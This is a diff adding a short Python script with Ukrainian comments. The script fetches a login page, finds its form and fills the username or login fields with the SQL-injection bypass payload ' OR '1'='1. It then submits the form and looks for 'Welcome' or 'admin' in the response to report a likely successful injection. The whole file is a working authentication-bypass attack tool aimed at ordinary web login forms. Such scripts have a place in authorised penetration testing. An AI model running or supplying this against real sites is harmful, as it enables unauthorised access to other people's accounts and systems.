@@ -1,0 +1,49 @@
+import requests
+from bs4 import BeautifulSoup
+from urllib.parse import urljoin
+
+# URL of the page to scrape \ до сторінки з формою входу
+target_url = "https://example.com/login"  # Replace with the actual URL
+
+# тестовий payload SQL-ін'єкції
+payload = "' OR '1'='1 "  # Replace with the actual payload
+
+# пошук полів форми
+session = requests.Session()
+res = session.get(target_url)
+soup = BeautifulSoup(res.text, "html.parser")
+form = soup.find("form")
+
+if not form:
+    print("[-] Форму не знайдено.")
+    exit()
+
+action = form.get("action", "")
+method = form.get("method", "get").lower()
+inputs = form.find_all("input")
+
+# Перевірка та побудова даних
+data = {}
+for input_tag in inputs:
+    name = input_tag.get("name")
+    if name:
+        # Додаємо SQL-ін'єкцію лише до полів логіна
+        if "login" in name.lower() or "username" in name.lower():
+            data[name] = payload
+        else:
+            data[name] = ""  # Порожнє поле для інших полів
+
+# Побудова повного URL
+url = urljoin(target_url, action)
+
+# Надсилаємо запит з SQL-ін'єкцією
+if method == "post":
+    response = session.post(url, data=data)
+else:
+    response = session.get(url, params=data)
+
+# Перевірка на ознаки успішної SQL-ін'єкції
+if "Welcome" in response.text or "admin" in response.text:
+    print("[+] Можлива SQL-ін'єкція знайдена!")
+else:
+    print("[-] Сторінка схоже захищена (або результат не очевидний).")
